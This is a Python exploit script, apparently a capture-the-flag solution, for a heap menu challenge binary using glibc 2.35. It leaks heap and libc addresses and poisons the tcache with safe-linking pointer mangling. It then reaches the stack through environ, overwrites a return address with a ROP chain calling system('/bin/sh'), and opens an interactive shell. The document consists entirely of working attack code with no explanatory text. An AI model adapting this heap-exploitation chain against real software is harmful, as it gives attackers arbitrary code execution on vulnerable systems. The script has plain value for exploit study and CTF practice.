#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./chall_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.35.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def link(addr: int, dest: int):
    return addr >> 12 ^ dest


def main():
    io = connect()

    def create(index: int):
        io.sendlineafter("> ", "1")
        io.sendlineafter("index: ", str(index))
        return

    def read(index: int, size):
        io.sendlineafter("> ", "2")
        io.sendlineafter("index: ", str(index))
        return io.recv(size)

    def update(index: int, data: bytes):
        if len(data) > 0x80:
            ptr.logger.error("data too long")
            exit(1)
        io.sendlineafter("> ", "3")
        io.sendlineafter("index: ", str(index))
        if len(data) == 0x80:
            io.sendafter("content: ", data)
        else:
            io.sendlineafter("content: ", data)
        return

    def delete(index: int):
        io.sendlineafter("> ", "4")
        io.sendlineafter("index: ", str(index))
        return

    create(0)
    delete(0)
    create(0)
    heap_base = ptr.u64(read(0, 5)) << 12
    print(f"heap_base: {hex(heap_base)}")

    create(1)
    update(1, b"gabage" * 10)
    delete(1)
    delete(0)
    update(5, ptr.p64(link(heap_base + 0x2A0, heap_base + 0x10)))

    create(0)
    create(1)
    create(2)
    create(3)
    create(4)
    delete(0)
    update(5, ptr.p64(link(heap_base + 0x2A0, heap_base + 0x3C0)))

    fake_tcache = ptr.p64(link(heap_base + 0x3C0, heap_base + 0x3D0)) + ptr.p64(0)
    fake_tcache += ptr.p64(link(heap_base + 0x3D0, heap_base + 0x3E0)) + ptr.p64(0)
    fake_tcache += ptr.p64(link(heap_base + 0x3E0, heap_base + 0x3F0)) + ptr.p64(0)
    fake_tcache += ptr.p64(link(heap_base + 0x3F0, heap_base + 0x400)) + ptr.p64(0)
    fake_tcache += ptr.p64(link(heap_base + 0x400, heap_base + 0x410)) + ptr.p64(0)
    fake_tcache += ptr.p64(heap_base >> 12)
    update(2, fake_tcache)
    update(1, ptr.p64(0) + ptr.p64(0x0007000000000000) + ptr.p64(0) * 2 * 7)
    delete(3)

    create(2)
    create(2)
    create(2)
    create(2)
    create(2)
    create(2)
    create(2)
    update(2, b"A" * 0x40)
    libc.base = ptr.u64(read(2, 0x46).split(b"A" * 0x40)[1]) - 0x219C0A
    print(f"libc_base: {hex(libc.base)}")
    update(
        2,
        b"A" * 0x38
        + ptr.p64(0x91)
        + ptr.p64(unwrap(libc.symbol("main_arena")) + 96) * 2,
    )

    create(0)
    update(0, b"hello")
    create(2)
    update(2, b"world")
    delete(2)
    delete(0)
    update(5, ptr.p64(link(heap_base + 0x450, unwrap(libc.symbol("environ")))))

    create(0)
    create(2)
    ret_addr = ptr.u64(read(2, 6)) - (0x7FFFFFFFDAE8 - 0x7FFFFFFFD9A8)
    print(f"ret_addr: {hex(ret_addr)}")

    payload = b""
    payload += ptr.p64(ret_addr + 0x18)

    create(2)
    update(2, b"hello")
    create(3)
    update(3, b"world")
    delete(3)
    delete(2)
    update(5, ptr.p64(link(heap_base + 0x600, ret_addr - 0x18)))

    create(2)
    create(3)

    rop = b""
    rop += ptr.p64(0x300000002)
    rop += ptr.p64(ret_addr - 0x18)
    rop += ptr.p64(ret_addr + 0x18)
    rop += ptr.p64(next(libc.gadget("ret;")))
    rop += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    rop += ptr.p64(next(libc.find("/bin/sh\x00")))
    rop += ptr.p64(unwrap(libc.symbol("system")))

    update(3, rop)
    io.sh()


if __name__ == "__main__":
    main()
